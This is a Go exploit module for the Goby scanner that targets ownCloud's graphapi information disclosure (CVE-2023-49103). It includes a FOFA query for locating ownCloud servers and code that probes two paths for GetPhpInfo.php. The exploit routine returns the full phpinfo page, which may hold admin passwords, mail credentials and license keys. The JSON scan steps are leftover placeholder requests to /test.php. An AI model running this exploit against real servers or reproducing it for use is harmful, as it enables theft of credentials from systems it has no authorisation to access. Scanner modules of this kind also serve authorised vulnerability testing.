package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OwnCloud GetPhpInfo.php Information Disclosure Vulnerability (CVE-2023-49103)",
    "Description": "<p>ownCloud is an open-source solution that enables secure and reliable file sharing and collaboration across devices and distributed environments.</p><p>An issue was discovered in ownCloud owncloud/graphapi 0.2.x before 0.2.1 and 0.3.x before 0.3.1. The graphapi app relies on a third-party GetPhpInfo.php library that provides a URL. When this URL is accessed, it reveals the configuration details of the PHP environment (phpinfo). This information includes all the environment variables of the webserver. In containerized deployments, these environment variables may include sensitive data such as the ownCloud admin password, mail server credentials, and license key. Simply disabling the graphapi app does not eliminate the vulnerability. Additionally, phpinfo exposes various other potentially sensitive configuration details that could be exploited by an attacker to gather information about the system. </p>",
    "Product": "ownCloud",
    "Homepage": "https://owncloud.com/",
    "DisclosureDate": "2023-11-22",
    "PostTime": "2024-07-18",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"ownCloud\" && body=\"ownCloud\"",
    "GobyQuery": "title=\"ownCloud\" && body=\"ownCloud\"",
    "Level": "1",
    "Impact": "<p>An issue was discovered in ownCloud owncloud/graphapi 0.2.x before 0.2.1 and 0.3.x before 0.3.1. The graphapi app relies on a third-party GetPhpInfo.php library that provides a URL. When this URL is accessed, it reveals the configuration details of the PHP environment (phpinfo). This information includes all the environment variables of the webserver. In containerized deployments, these environment variables may include sensitive data such as the ownCloud admin password, mail server credentials, and license key. Simply disabling the graphapi app does not eliminate the vulnerability. Additionally, phpinfo exposes various other potentially sensitive configuration details that could be exploited by an attacker to gather information about the system. </p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://owncloud.com/\">https://owncloud.com/</a></p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2023-49103"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "GetInfo",
            "type": "select",
            "value": "GetInfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2023-49103"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "4.0",
    "Translation": {
        "CN": {
            "Name": "OwnCloud GetPhpInfo.php 信息泄露漏洞（CVE-2023-49103）",
            "Product": "ownCloud",
            "Description": "<p>ownCloud是一个开源解决方案，可实现跨设备、跨分布式环境，安全可靠地进行文件共享及协作。<br></p><p>ownCloud owncloud/graphapi 0.2.x在0.2.1之前和0.3.x在0.3.1之前存在漏洞。graphapi应用程序依赖于提供URL的第三方GetPhpInfo.php库。当访问此URL时，会显示PHP环境的配置详细信息（phpinfo）。此信息包括Web服务器的所有环境变量，包括敏感数据，如ownCloud管理员密码、邮件服务器凭据和许可证密钥。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://owncloud.com/\">https://owncloud.com/</a><br></p>",
            "Impact": "<p>ownCloud owncloud/graphapi 0.2.x在0.2.1之前和0.3.x在0.3.1之前存在漏洞。graphapi应用程序依赖于提供URL的第三方GetPhpInfo.php库。当访问此URL时，会显示PHP环境的配置详细信息（phpinfo）。此信息包括Web服务器的所有环境变量，包括敏感数据，如ownCloud管理员密码、邮件服务器凭据和许可证密钥。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "OwnCloud GetPhpInfo.php Information Disclosure Vulnerability (CVE-2023-49103)",
            "Product": "ownCloud",
            "Description": "<p>ownCloud is an open-source solution that enables secure and reliable file sharing and collaboration across devices and distributed environments.<br></p><p>An issue was discovered in ownCloud owncloud/graphapi 0.2.x before 0.2.1 and 0.3.x before 0.3.1. The graphapi app relies on a third-party GetPhpInfo.php library that provides a URL. When this URL is accessed, it reveals the configuration details of the PHP environment (phpinfo). This information includes all the environment variables of the webserver. In containerized deployments, these environment variables may include sensitive data such as the ownCloud admin password, mail server credentials, and license key. Simply disabling the graphapi app does not eliminate the vulnerability. Additionally, phpinfo exposes various other potentially sensitive configuration details that could be exploited by an attacker to gather information about the system.&nbsp;<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://owncloud.com/\">https://owncloud.com/</a><br></p>",
            "Impact": "<p>An issue was discovered in ownCloud owncloud/graphapi 0.2.x before 0.2.1 and 0.3.x before 0.3.1. The graphapi app relies on a third-party GetPhpInfo.php library that provides a URL. When this URL is accessed, it reveals the configuration details of the PHP environment (phpinfo). This information includes all the environment variables of the webserver. In containerized deployments, these environment variables may include sensitive data such as the ownCloud admin password, mail server credentials, and license key. Simply disabling the graphapi app does not eliminate the vulnerability. Additionally, phpinfo exposes various other potentially sensitive configuration details that could be exploited by an attacker to gather information about the system.&nbsp;<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10972"
}`
	sendPayloadjnaefhanuhebqufqyvfwuq := func(hostInfo *httpclient.FixUrl, vulPath string) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulInfo := ``
		requestConfig := httpclient.NewGetRequestConfig(vulPath)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "phpinfo()") {
				vulInfo = resp.RawBody
				return true, vulInfo, vulPath
			}
		}

		return false, vulInfo, vulPath
	}
	getWayqnfqjkfbqbfqfbubiqfudsada := func(hostInfo *httpclient.FixUrl) (string, bool) {
		requestConfig := httpclient.NewGetRequestConfig("/index.php/login")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if strings.Contains(resp.RawBody, "ownCloud") {
				return "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php", true
			}
		}
		requestConfig.URI = "/owncloud/index.php/login"
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if strings.Contains(resp.RawBody, "ownCloud") {
				return "/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php", true
			}
		}
		return "", false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			vulnurl, way := getWayqnfqjkfbqbfqfbubiqfudsada(hostInfo)
			if way == false {
				return false
			}
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, vulPath := sendPayloadjnaefhanuhebqufqyvfwuq(hostInfo, vulnurl)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.FixedHostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			vulnurl, way := getWayqnfqjkfbqbfqfbubiqfudsada(expResult.HostInfo)
			if way == false {
				expResult.Success = false
				return expResult
			}
			_, vulInfo, vulPath := sendPayloadjnaefhanuhebqufqyvfwuq(expResult.HostInfo, vulnurl)
			expResult.Output = "vulnURL:\n" + expResult.HostInfo.FixedHostInfo + vulPath + "\nPHPinfo:\n" + vulInfo
			expResult.Success = true
			return expResult
		},
	))
}
